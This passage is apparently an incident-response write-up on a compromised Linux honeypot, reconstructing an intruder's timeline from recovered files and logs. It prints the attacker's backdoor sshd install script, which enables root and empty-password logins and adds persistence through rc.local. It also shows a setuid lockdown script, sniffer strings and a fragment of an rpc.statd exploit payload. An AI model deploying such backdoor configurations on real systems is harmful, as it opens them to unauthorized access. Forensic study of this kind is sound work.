+(as can be seen by access time change, creation of "sniff.pid" file
+with a process ID of 2485, and creation of the "tcp.log" file), but
+the sniffer did not log any connections.
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+Nov 08 00 06:52:13     7229 .a. -rwxr-xr-x 1010     users    /t/usr/man/.Ci/snif
+                          5 mac -rw-r--r-- root     root     /t/usr/man/.Ci/sniff.pid
+                          0 mac -rw-r--r-- root     root     /t/usr/man/.Ci/tcp.log
+
+# less sniff.pid
+2485
+# strings
+cant get SOCK_PACKET socket
+cant get flags
+cant set promiscuous mode
+----- [CAPLEN Exceeded]
+----- [Timed Out]
+----- [RST]
+----- [FIN]
+%s => 
+%s [%d]
+sniff.pid
+eth0
+tcp.log
+cant open log
+rm %s
+Exiting...
+ . . .
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+
+At 06:53, the intruder installs an SSH version 1 server, generates a
+new host public/private key pair, and modifies "/t/etc/rc.d/rc.local"
+file to end with the line "/usr/local/sbin/sshd1" (starting the daemon
+on each reboot).  Finally, we can see the sshd1 daemon is started.
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+Nov 08 00 06:53:06     1024 m.c drwxr-x--- root     root     /t/root
+                       1024 .a. drwxr-xr-x root     root     /t/root/.ssh
+                       3970 .a. -rw-r--r-- root     root     /t/usr/lib/libbsd-compat.a
+                         15 .a. lrwxrwxrwx root     root     /t/usr/lib/libbsd.a -> libbsd-compat.a
+                         23 .a. lrwxrwxrwx root     root     /t/usr/lib/libcrypt.so -> ../../lib/libcrypt.so.1
+                         21 .a. lrwxrwxrwx root     root     /t/usr/lib/libnsl.so -> ../../lib/libnsl.so.1
+                         22 .a. lrwxrwxrwx root     root     /t/usr/lib/libutil.so -> ../../lib/libutil.so.1
+                    1106314 .a. -rw-r--r-- root     root     <honeypot.hda5.dd-dead-79331>
+                      21221 .a. -rwxr-xr-x 17275    games    <honeypot.hda5.dd-dead-93950>
+                      47440 .a. -rw-r--r-- root     root     <honeypot.hda5.dd-dead-94381>
+                     337617 m.. -rwxr-xr-x root     root     <honeypot.hda5.dd-dead-94415>
+                      81932 .a. -rw-r--r-- root     root     <honeypot.hda5.dd-dead-94416>
+                      90424 m.. -rwxr-xr-x root     root     <honeypot.hda5.dd-dead-94417>
+                      21228 m.. -rwxr-xr-x root     root     <honeypot.hda5.dd-dead-94418>
+Nov 08 00 06:53:08    34816 .a. drwxr-xr-x root     root     /t/dev
+                      12288 m.c -rw-rw-r-- root     root     /t/etc/psdevtab
+                       1024 m.c drwxr-xr-x root     root     /t/root/.ssh
+                        512 .a. -rw------- root     root     /t/root/.ssh/random_seed
+Nov 08 00 06:53:10      880 .a. -rw-r--r-- root     root     /t/etc/ssh_config
+                        537 m.c -rw------- root     root     /t/etc/ssh_host_key
+                        341 mac -rw-r--r-- root     root     /t/etc/ssh_host_key.pub
+                        512 m.c -rw------- root     root     /t/root/.ssh/random_seed
+Nov 08 00 06:53:11      880 m.c -rw-r--r-- root     root     /t/etc/ssh_config
+                          3 mac lrwxrwxrwx root     root     /t/usr/local/bin/slogin -> ssh
+                          4 mac lrwxrwxrwx root     root     /t/usr/local/bin/ssh -> ssh1
+                         11 mac lrwxrwxrwx root     root     /t/usr/local/bin/ssh-keygen -> ssh-keygen1
+                     327262 mac -rwxr-xr-x root     root     /t/usr/local/bin/ssh-keygen1
+                     604938 mac -rws--x--x root     root     /t/usr/local/bin/ssh1
+                        880 .a. -rw-r--r-- 17275    games    <honeypot.hda5.dd-dead-93944>
+                        691 .a. -rw-r--r-- 17275    games    <honeypot.hda5.dd-dead-93948>
+                     604938 .a. -rwxr-xr-x root     root     <honeypot.hda5.dd-dead-94398>
+                     327262 .a. -rwxr-xr-x root     root     <honeypot.hda5.dd-dead-94411>
+Nov 08 00 06:53:12       21 mac lrwxrwxrwx root     root     /t/usr/local/bin/make-ssh-known-hosts -> make-ssh-known-hosts1
+                      21228 mac -rwxr-xr-x root     root     /t/usr/local/bin/make-ssh-known-hosts1
+                          4 mac lrwxrwxrwx root     root     /t/usr/local/bin/scp -> scp1
+                      90424 mac -rwxr-xr-x root     root     /t/usr/local/bin/scp1
+                          8 mac lrwxrwxrwx root     root     /t/usr/local/bin/ssh-add -> ssh-add1
+                     337617 mac -rwxr-xr-x root     root     /t/usr/local/bin/ssh-add1
+                         10 mac lrwxrwxrwx root     root     /t/usr/local/bin/ssh-agent -> ssh-agent1
+                     343586 mac -rwxr-xr-x root     root     /t/usr/local/bin/ssh-agent1
+                          5 m.c lrwxrwxrwx root     root     /t/usr/local/sbin/sshd -> sshd1
+                     643674 m.c -rwxr-xr-x root     root     /t/usr/local/sbin/sshd1
+                     643674 .a. -rwxr-xr-x root     root     <honeypot.hda5.dd-dead-94409>
+                     343586 .a. -rwxr-xr-x root     root     <honeypot.hda5.dd-dead-94413>
+                     337617 .a. -rwxr-xr-x root     root     <honeypot.hda5.dd-dead-94415>
+                      90424 .a. -rwxr-xr-x root     root     <honeypot.hda5.dd-dead-94417>
+                      21228 .a. -rwxr-xr-x root     root     <honeypot.hda5.dd-dead-94418>
+Nov 08 00 06:53:13        4 .a. lrwxrwxrwx root     root     /t/bin/awk -> gawk
+                     148848 .a. -rwxr-xr-x root     root     /t/bin/gawk
+                     148848 .a. -rwxr-xr-x root     root     /t/bin/gawk-3.0.4
+                      20240 .a. -rwxr-xr-x root     root     /t/bin/ln
+                        955 m.c -rwxr-xr-x root     root     /t/etc/rc.d/rc.local
+                        684 m.c -rw-r--r-- root     root     /t/etc/sshd_config
+                       4096 m.c drwxr-xr-x root     root     /t/usr/local/man/man1
+                         23 mac lrwxrwxrwx root     root     /t/usr/local/man/man1/make-ssh-known-hosts.1 -> make-ssh-known-hosts1.1
+                      12272 mac -rw-r--r-- root     root     /t/usr/local/man/man1/make-ssh-known-hosts1.1
+                          6 mac lrwxrwxrwx root     root     /t/usr/local/man/man1/scp.1 -> scp1.1
+                       4892 mac -rw-r--r-- root     root     /t/usr/local/man/man1/scp1.1
+                          5 mac lrwxrwxrwx root     root     /t/usr/local/man/man1/slogin.1 -> ssh.1
+                          6 mac lrwxrwxrwx root     root     /t/usr/local/man/man1/slogin1.1 -> ssh1.1
+                         10 mac lrwxrwxrwx root     root     /t/usr/local/man/man1/ssh-add.1 -> ssh-add1.1
+                       4007 mac -rw-r--r-- root     root     /t/usr/local/man/man1/ssh-add1.1
+                         12 mac lrwxrwxrwx root     root     /t/usr/local/man/man1/ssh-agent.1 -> ssh-agent1.1
+                       6265 mac -rw-r--r-- root     root     /t/usr/local/man/man1/ssh-agent1.1
+                         13 mac lrwxrwxrwx root     root     /t/usr/local/man/man1/ssh-keygen.1 -> ssh-keygen1.1
+                       5824 mac -rw-r--r-- root     root     /t/usr/local/man/man1/ssh-keygen1.1
+                          6 mac lrwxrwxrwx root     root     /t/usr/local/man/man1/ssh.1 -> ssh1.1
+                      38572 mac -rw-r--r-- root     root     /t/usr/local/man/man1/ssh1.1
+                       4096 m.c drwxr-xr-x root     root     /t/usr/local/man/man8
+                          7 mac lrwxrwxrwx root     root     /t/usr/local/man/man8/sshd.8 -> sshd1.8
+                      37023 mac -rw-r--r-- root     root     /t/usr/local/man/man8/sshd1.8
+                       1076 .a. -rwxr-xr-x 1010     users    <honeypot.hda5.dd-dead-109802>
+                       5824 .a. -rw-r--r-- 17275    games    <honeypot.hda5.dd-dead-93956>
+                       6265 .a. -rw-r--r-- 17275    games    <honeypot.hda5.dd-dead-93957>
+                       4007 .a. -rw-r--r-- 17275    games    <honeypot.hda5.dd-dead-93958>
+                       4892 .a. -rw-r--r-- 17275    games    <honeypot.hda5.dd-dead-93959>
+                      37023 .a. -rw-r--r-- root     root     <honeypot.hda5.dd-dead-94361>
+                      38572 .a. -rw-r--r-- root     root     <honeypot.hda5.dd-dead-94362>
+                      12272 .a. -rw-r--r-- root     root     <honeypot.hda5.dd-dead-94363>
+                          0 ma. -rwxr-xr-x root     root     <honeypot.hda5.dd-dead-94419>
+ . . .
+Nov 08 00 06:53:33    32816 .a. -rwxr-xr-x root     root     /t/bin/netstat
+                     202709 .a. -rw-r--r-- root     root     /t/boot/System.map-2.2.14-5.0
+                        537 .a. -rw------- root     root     /t/etc/ssh_host_key
+                        512 .a. -rw------- root     root     /t/etc/ssh_random_seed
+                        684 .a. -rw-r--r-- root     root     /t/etc/sshd_config
+                      47008 .a. -rwxr-xr-x root     root     /t/lib/libutil-2.1.3.so
+                         16 .a. lrwxrwxrwx root     root     /t/lib/libutil.so.1 -> libutil-2.1.3.so
+                          5 .a. lrwxrwxrwx root     root     /t/usr/local/sbin/sshd -> sshd1
+                     643674 .a. -rwxr-xr-x root     root     /t/usr/local/sbin/sshd1
+                          5 mac -rw-r--r-- root     root     /t/var/run/sshd.pid
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+
+The deleted i-node with ownership 1010/users is suspicious.
+Recovered, it is found to be the sshd installation script:
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+echo "installing sshd"
+gunzip ssh-1.2.27*
+tar -xvf ssh-1.2.27*
+cd ssh*
+make install
+rm -rf /etc/sshd_config
+cat << hi >> /etc/sshd_config
+# This is ssh server systemwide configuration file.
+
+Port 22
+ListenAddress 0.0.0.0
+HostKey /etc/ssh_host_key
+RandomSeed /etc/ssh_random_seed
+ServerKeyBits 768
+LoginGraceTime 600
+KeyRegenerationInterval 3600
+PermitRootLogin yes
+IgnoreRhosts no
+StrictModes yes
+QuietMode yes
+X11Forwarding yes
+X11DisplayOffset 10
+FascistLogging no
+PrintMotd yes
+KeepAlive yes
+SyslogFacility DAEMON
+RhostsAuthentication no
+RhostsRSAAuthentication yes
+RSAAuthentication yes
+PasswordAuthentication yes
+PermitEmptyPasswords yes
+UseLogin no
+# CheckMail no
+# PidFile /u/zappa/.ssh/pid
+# AllowHosts *.our.com friend.other.com
+# DenyHosts lowsecurity.theirs.com *.evil.org evil.org
+# Umask 022
+# SilentDeny yes
+hi
+echo "/usr/local/sbin/sshd1" >> /etc/rc.d/rc.local
+ps aux | grep sshd | awk '{print "kill -1 "$2""}' > restart-sshd
+chmod +x restart-sshd
+echo "done installing sshd"
+echo "now restarting"
+echo "dont forget to remove the sshd folders"
+./restart-sshd
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+
+The file "chmod-it" is run at 06:57:00.  This script contains the
+following commands:
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+echo starting..
+sleep 1
+
+chmod 700 /usr/sbin/userhelper
+echo !:  userhelper..done
+chmod 700 /usr/X11R6/bin/Xwrapper
+echo !:  Xwrapper..done
+chmod 700 /bin/ping
+echo !:  ping..done
+chmod 700 /usr/sbin/traceroute
+echo !:  traceroute..done
+chmod 700 /usr/libexec/pt_chown
+echo !:  pt_chown..done
+chmod 700 /sbin/dump
+echo !:  dump..done
+chmod 700 /sbin/restore
+echo !:  restore..done
+chmod 700 /usr/bin/gpasswd
+echo !:  gpasswd..done
+chmod 700 /usr/bin/chage
+echo !:  change..done
+chmod 700 /usr/bin/suidperl
+echo !:  suidperl..done
+chmod 700 /usr/bin/newgrp
+echo !:  newgrp..done
+chmod 700 /usr/sbin/usernetctl
+echo !:  usernetctl..done
+chmod 700 /usr/bin/at
+echo !:  at..done
+sleep 1
+echo ..finished
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+
+Noting the change time of these files confirms it was run.  This
+effectively disables local use of these files by anyone but root
+(which also prevents local exploit of these services, which are
+assumed to be vulnerable).  This is a defense measure meant to prevent
+someone else compromising this system and taking it over from the
+intruder.  (It would also be noticed by anyone other than root
+trying to use these programs.)
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+Nov 08 00 06:56:59    17968 ..c -rwx------ root     root     /t/bin/ping
+                       5760 .a. -rwxr-xr-x root     root     /t/bin/sleep
+                      45388 ..c -rwx------ root     tty      /t/sbin/dump
+                      67788 ..c -rwx------ root     tty      /t/sbin/restore
+                      33288 ..c -rwx------ root     root     /t/usr/bin/at
+                      35168 ..c -rwx------ root     root     /t/usr/bin/chage
+                      36756 ..c -rwx------ root     root     /t/usr/bin/gpasswd
+                       5640 ..c -rwx------ root     root     /t/usr/bin/newgrp
+                     531516 ..c -rwx------ root     root     /t/usr/bin/sperl5.00503
+                     531516 ..c -rwx------ root     root     /t/usr/bin/suidperl
+                      34751 ..c -rwx------ root     root     /t/usr/libexec/pt_chown
+                      16488 ..c -rwx------ root     bin      /t/usr/sbin/traceroute
+                       5896 ..c -rwx------ root     root     /t/usr/sbin/usernetctl
+Nov 08 00 06:57:00      699 .a. -rwxr-xr-x 1010     users    /t/usr/man/.Ci/chmod-it
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+
+At 06:57:06, a directory is created ("mkdir" accessed), most likely in
+the /tmp directory (due to the timing).  The ownerships of a
+file/directory are modified, then the "su" command is run.  The access
+of the BASH resource command file (".bashrc") indicates that the
+"drosen" account was the one used (this matches the file ownerships of
+the deleted tar archive.)  It is uncompressed and unpacked, then
+immediately deleted at 06:58:45:
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+Nov 08 00 06:57:06    13696 .a. -rwxr-xr-x root     root     /t/bin/mkdir
+Nov 08 00 06:57:08     1024 .a. drwxrwxrwx root     root     /t/tmp
+Nov 08 00 06:58:19    11952 .a. -rwxr-xr-x root     root     /t/bin/chown
+Nov 08 00 06:58:26    14188 .a. -rwsr-xr-x root     root     /t/bin/su
+                        331 .a. -rw-r--r-- root     root     /t/etc/pam.d/su
+                        124 .a. -rw-r--r-- drosen   drosen   /t/home/drosen/.bashrc
+                      17282 .a. -rwxr-xr-x root     root     /t/lib/security/pam_xauth.so
+Nov 08 00 06:58:28    46384 .a. -rwxr-xr-x root     root     /t/bin/gunzip
+                      46384 .a. -rwxr-xr-x root     root     /t/bin/gzip
+                      46384 .a. -rwxr-xr-x root     root     /t/bin/zcat
+Nov 08 00 06:58:41   144592 .a. -rwxr-xr-x root     root     /t/bin/tar
+
+Nov 08 00 06:58:42  2129920 .a. -rw-r--r-- drosen   drosen   <honeypot.hda8.dd-dead-8133>
+Nov 08 00 06:58:45  2129920 ..c -rw-r--r-- drosen   drosen   <honeypot.hda8.dd-dead-8133>
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+[NOT FINISHED]
+
+Nov 08 00 06:54:18   493031 .a. -rwxr-xr-x 1002     users    <honeypot.hda5.dd-dead-63104>
+                    1172532 .a. -rwxr-xr-x 1002     users    <honeypot.hda5.dd-dead-63118>
+                       1815 .a. -rw-r--r-- 1002     users    <honeypot.hda5.dd-dead-63122>
+                    1141797 .a. -rwxr-xr-x 1002     users    <honeypot.hda5.dd-dead-63123>
+Nov 08 00 06:54:21 10260480 .a. -rwxr-xr-x 1010     users    <honeypot.hda5.dd-dead-109861>
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+# icat honeypot.hda5.dd 109861 > foo
+# file foo 
+foo: GNU tar archive
+# tar -tvf foo
+drwxr-xr-x ca/users          0 1999-11-25 14:37:19 bin/
+drwxr-xr-x ca/users          0 1999-11-25 14:41:26 bin/dig/
+-rwxr-xr-x ca/users    1123728 1999-11-25 14:18:01 bin/dig/dig
+drwxr-xr-x ca/users          0 1999-11-25 14:39:33 bin/addr/
+-rwxr-xr-x ca/users      52577 1999-11-25 14:17:50 bin/addr/addr
+drwxr-xr-x ca/users          0 1999-11-25 14:41:29 bin/dnskeygen/
+-rwxr-xr-x ca/users     493031 1999-11-25 14:18:49 bin/dnskeygen/dnskeygen
+drwxr-xr-x ca/users          0 1999-11-25 14:41:31 bin/dnsquery/
+-rwxr-xr-x ca/users    1037887 1999-11-25 14:18:02 bin/dnsquery/dnsquery
+drwxr-xr-x ca/users          0 1999-11-25 14:41:33 bin/host/
+-rwxr-xr-x ca/users    1079584 1999-11-25 14:18:05 bin/host/host
+drwxr-xr-x ca/users          0 1999-11-25 14:41:37 bin/irpd/
+-rwxr-xr-x ca/users    1111098 1999-11-25 14:18:49 bin/irpd/irpd
+drwxr-xr-x ca/users          0 1999-11-25 14:41:40 bin/mkservdb/
+-rwxr-xr-x ca/users      41427 1999-11-25 14:18:46 bin/mkservdb/mkservdb
+drwxr-xr-x ca/users          0 1999-11-25 14:41:45 bin/named/
+-rwxr-xr-x ca/users    1768665 1999-11-25 14:18:39 bin/named/named
+drwxr-xr-x ca/users          0 1999-11-25 14:41:48 bin/named-bootconf/
+-rwxr-xr-x ca/users       7166 1999-11-25 14:18:49 bin/named-bootconf/named-bootconf
+drwxr-xr-x ca/users          0 1999-11-25 14:41:52 bin/named-xfer/
+-rwxr-xr-x ca/users    1172532 1999-11-25 14:18:43 bin/named-xfer/named-xfer
+drwxr-xr-x ca/users          0 1999-11-25 14:41:55 bin/ndc/
+-rwxr-xr-x ca/users     173212 1999-11-25 14:18:44 bin/ndc/ndc
+drwxr-xr-x ca/users          0 1999-11-25 14:43:34 bin/nslookup/
+-rw-r--r-- ca/users       1815 1999-11-25 14:43:27 bin/nslookup/nslookup.help
+-rwxr-xr-x ca/users    1141797 1999-11-25 14:17:58 bin/nslookup/nslookup
+drwxr-xr-x ca/users          0 1999-11-25 14:42:08 bin/nsupdate/
+-rwxr-xr-x ca/users    1029928 1999-11-25 14:18:45 bin/nsupdate/nsupdate
+-rwxr-xr-x ca/users       1197 1999-12-25 14:14:55 bin/install
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+Nov 08 00 06:54:22     6416 mac -rwxr-xr-x root     root     /t/usr/local/bin/addr
+                     271188 m.. -rwxr-xr-x root     root     /t/usr/local/bin/dig
+                    1123728 .a. -rwxr-xr-x 1002     users    <honeypot.hda5.dd-dead-63100>
+                      52577 .a. -rwxr-xr-x 1002     users    <honeypot.hda5.dd-dead-63102>
+Nov 08 00 06:54:23   271188 ..c -rwxr-xr-x root     root     /t/usr/local/bin/dig
+                     241744 mac -rwxr-xr-x root     root     /t/usr/local/bin/dnsquery
+                     260816 mac -rwxr-xr-x root     root     /t/usr/local/bin/host
+                     263960 .a. -rwxr-xr-x root     root     /t/usr/local/sbin/irpd
+                    1037887 .a. -rwxr-xr-x 1002     users    <honeypot.hda5.dd-dead-63106>
+                    1079584 .a. -rwxr-xr-x 1002     users    <honeypot.hda5.dd-dead-63108>
+                    1111098 .a. -rwxr-xr-x 1002     users    <honeypot.hda5.dd-dead-63110>
+Nov 08 00 06:54:24    38096 .a. -rwxr-xr-x root     root     /t/usr/bin/install
+                     176464 .a. -rwxr-xr-x root     root     /t/usr/bin/strip
+                       4096 m.c drwxr-xr-x root     root     /t/usr/local/bin
+                       3296 mac -rwxr-xr-x root     root     /t/usr/local/bin/mkservdb
+                     241792 mac -rwxr-xr-x root     root     /t/usr/local/bin/nsupdate
+                       4096 m.c drwxr-xr-x root     root     /t/usr/local/sbin
+                     263960 m.c -rwxr-xr-x root     root     /t/usr/local/sbin/irpd
+                     525412 m.c -rwxr-xr-x root     root     /t/usr/local/sbin/named
+                       7166 mac -rwxr-xr-x root     root     /t/usr/local/sbin/named-bootconf
+                      36960 mac -rwxr-xr-x root     root     /t/usr/local/sbin/ndc
+                    1029928 mac -rw------- root     root     <honeypot.hda5.dd-dead-109807>
+                      41427 .a. -rwxr-xr-x 1002     users    <honeypot.hda5.dd-dead-63112>
+                    1768665 .a. -rwxr-xr-x 1002     users    <honeypot.hda5.dd-dead-63114>
+                       7166 .a. -rwxr-xr-x 1002     users    <honeypot.hda5.dd-dead-63116>
+                     173212 .a. -rwxr-xr-x 1002     users    <honeypot.hda5.dd-dead-63120>
+                    1029928 .a. -rwxr-xr-x 1002     users    <honeypot.hda5.dd-dead-63125>
+Nov 08 00 06:54:25    33392 .a. -rwxr-xr-x root     root     /t/bin/cp
+                        547 .a. -rw-r--r-- root     root     /t/etc/named.conf
+                     525412 .a. -rwxr-xr-x root     root     /t/usr/local/sbin/named
+                       4096 m.c drwxr-xr-x root     root     /t/usr/sbin
+                     525412 mac -rwxr-xr-x root     root     /t/usr/sbin/named
+                      35504 .a. -rwxr-xr-x root     root     /t/usr/sbin/ndc
+                       2769 .a. -rw-r--r-- root     root     /t/var/named/named.ca
+                        422 .a. -rw-r--r-- root     root     /t/var/named/named.local
+                       1024 m.c drwxr-xr-x root     root     /t/var/run
+                          5 mac -rw-r--r-- root     root     /t/var/run/named.pid
+                          0 mac -rw------- root     root     /t/var/run/ndc
+Nov 08 00 06:54:28   271188 .a. -rwxr-xr-x root     root     /t/usr/local/bin/dig
+Nov 08 00 06:54:43       80 .a. -rwxr-xr-x 1010     users    <honeypot.hda5.dd-dead-109803>
+                   10260480 ..c -rwxr-xr-x 1010     users    <honeypot.hda5.dd-dead-109861>
+                          0 mac drwxr-xr-x 1002     users    <honeypot.hda5.dd-dead-63098>
+                          0 mac drwxr-xr-x 1002     users    <honeypot.hda5.dd-dead-63099>
+                    1123728 ..c -rwxr-xr-x 1002     users    <honeypot.hda5.dd-dead-63100>
+                          0 mac drwxr-xr-x 1002     users    <honeypot.hda5.dd-dead-63101>
+                      52577 ..c -rwxr-xr-x 1002     users    <honeypot.hda5.dd-dead-63102>
+                          0 mac drwxr-xr-x 1002     users    <honeypot.hda5.dd-dead-63103>
+                     493031 ..c -rwxr-xr-x 1002     users    <honeypot.hda5.dd-dead-63104>
+                          0 mac drwxr-xr-x 1002     users    <honeypot.hda5.dd-dead-63105>
+                    1037887 ..c -rwxr-xr-x 1002     users    <honeypot.hda5.dd-dead-63106>
+                          0 mac drwxr-xr-x 1002     users    <honeypot.hda5.dd-dead-63107>
+                    1079584 ..c -rwxr-xr-x 1002     users    <honeypot.hda5.dd-dead-63108>
+                          0 mac drwxr-xr-x 1002     users    <honeypot.hda5.dd-dead-63109>
+                    1111098 ..c -rwxr-xr-x 1002     users    <honeypot.hda5.dd-dead-63110>
+                          0 mac drwxr-xr-x 1002     users    <honeypot.hda5.dd-dead-63111>
+                      41427 ..c -rwxr-xr-x 1002     users    <honeypot.hda5.dd-dead-63112>
+                          0 mac drwxr-xr-x 1002     users    <honeypot.hda5.dd-dead-63113>
+                    1768665 ..c -rwxr-xr-x 1002     users    <honeypot.hda5.dd-dead-63114>
+                          0 mac drwxr-xr-x 1002     users    <honeypot.hda5.dd-dead-63115>
+                       7166 ..c -rwxr-xr-x 1002     users    <honeypot.hda5.dd-dead-63116>
+                          0 mac drwxr-xr-x 1002     users    <honeypot.hda5.dd-dead-63117>
+                    1172532 ..c -rwxr-xr-x 1002     users    <honeypot.hda5.dd-dead-63118>
+                          0 mac drwxr-xr-x 1002     users    <honeypot.hda5.dd-dead-63119>
+                     173212 ..c -rwxr-xr-x 1002     users    <honeypot.hda5.dd-dead-63120>
+                          0 mac drwxr-xr-x 1002     users    <honeypot.hda5.dd-dead-63121>
+                       1815 ..c -rw-r--r-- 1002     users    <honeypot.hda5.dd-dead-63122>
+                    1141797 ..c -rwxr-xr-x 1002     users    <honeypot.hda5.dd-dead-63123>
+                          0 mac drwxr-xr-x 1002     users    <honeypot.hda5.dd-dead-63124>
+                    1029928 ..c -rwxr-xr-x 1002     users    <honeypot.hda5.dd-dead-63125>
+                       1197 .ac -rwxr-xr-x 1002     users    <honeypot.hda5.dd-dead-63126>
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+
+The last modification/change to the /var/log directory is a few
+hours after this point:
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+-rw-------    1 root     root        31607 Nov  8 20:10 cron
+-rw-r--r--    1 root     root      1460292 Nov  8 18:37 lastlog
+-rw-r--r--    1 root     root          768 Nov  8 18:37 wtmp
+drwxr-xr-x    6 root     root         1024 Nov  8 06:56 .
+-rw-r--r--    1 root     root         7974 Nov  8 06:56 messages
+-rw-r--r--    1 root     root          268 Nov  8 06:56 secure
+-rw-r--r--    1 root     root            0 Nov  8 06:56 xferlog
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+Examination of the last lines of the "messages" and "secure" log files
+shows they were likely edited at 06:56:02:
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+# stat /t/var/log
+  File: "/t/var/log"
+  Size: 1024         Filetype: Directory
+  Mode: (0755/drwxr-xr-x)         Uid: (    0/    root)  Gid: (    0/    root)
+Device:  7,4   Inode: 12097     Links: 6    
+Access: Wed Nov  8 02:02:05 2000(00003.10:38:45)
+Modify: Wed Nov  8 06:56:02 2000(00003.05:44:48)
+Change: Wed Nov  8 06:56:02 2000(00003.05:44:48)
+
+# tail messages secure
+==> messages <==
+Nov  5 09:33:53 apollo rc: Starting linuxconf succeeded
+Nov  5 09:37:40 apollo kernel: EXT2-fs warning: mounting unchecked fs, running e2fsck is recommended 
+Nov  5 10:54:05 apollo modprobe: modprobe: Can't locate module eht0
+Nov  5 10:54:52 apollo inetd[408]: pid 680: exit status 1
+Nov  6 03:00:41 apollo ftpd[973]: FTP session closed
+Nov  6 04:02:00 apollo anacron[1003]: Updated timestamp for job `cron.daily' to 2000-11-06
+Nov  7 04:02:00 apollo anacron[1576]: Updated timestamp for job `cron.daily' to 2000-11-07
+Nov  8 00:08:41 apollo inetd[408]: pid 2077: exit status 1
+Nov  8 00:08:41 apollo inetd[408]: pid 2078: exit status 1
+Nov  8 04:02:00 apollo anacron[2159]: Updated timestamp for job `cron.daily' to 2000-11-08
+
+==> secure <==
+Nov  5 10:54:49 apollo in.telnetd[680]: connect from 207.239.115.11
+Nov  6 02:59:23 apollo in.ftpd[973]: connect from 128.121.247.126
+Nov  8 00:08:40 apollo in.telnetd[2077]: connect from 216.216.74.2
+Nov  8 00:08:40 apollo in.telnetd[2078]: connect from 216.216.74.2
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+A quick search of strings within the original /var partition copy
+identifies a line in deleted file space which may indicate the method
+and exact time of intrusion:
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+# strings /x/honeypot.hda7.dd | grep "Nov  8 " | less
+ . . .
+Nov  8 00:09:00 apollo rpc.statd[270]: SM_MON request for hostname containing '/
+': ^D
+ . . .
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+A more thorough examination of this partition [technique courtesey of
+Wietse Venema] allows recovery of the entire deleted segment of syslog
+data.  (Note that you must use -B so that less would not suck all data
+into memory.)
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+# unrm honeypot.hda7.dd | less -B
+    . . .
+    Nov  5 10:54:05 apollo modprobe: modprobe: Can't locate module eht0
+    Nov  5 10:54:52 apollo inetd[408]: pid 680: exit status 1
+    Nov  5 10:55:11 apollo PAM_pwdb[621]: (login) session closed for user root
+    Nov  6 03:00:41 apollo ftpd[973]: FTP session closed
+    Nov  6 04:02:00 apollo anacron[1003]: Updated timestamp for job `cron.daily' to 2000-11-06
+    Nov  7 04:02:00 apollo anacron[1576]: Updated timestamp for job `cron.daily' to 2000-11-07
+    Nov  8 00:08:41 apollo inetd[408]: pid 2077: exit status 1
+    Nov  8 00:08:41 apollo inetd[408]: pid 2078: exit status 1
+    Nov  8 00:09:00 apollo rpc.statd[270]: SM_MON request for ho\
+    stname containing '/': ^D<F7><FF><BF>^D<F7><FF><BF>^E<F7><FF\
+    ><BF>^E<F7><FF><BF>^F<F7><FF><BF>^F<F7><FF><BF>^G<F7><FF><BF\
+    >^G<F7><FF><BF>08049f10 bffff754 000028f8 4d5f4d53 72204e4f \
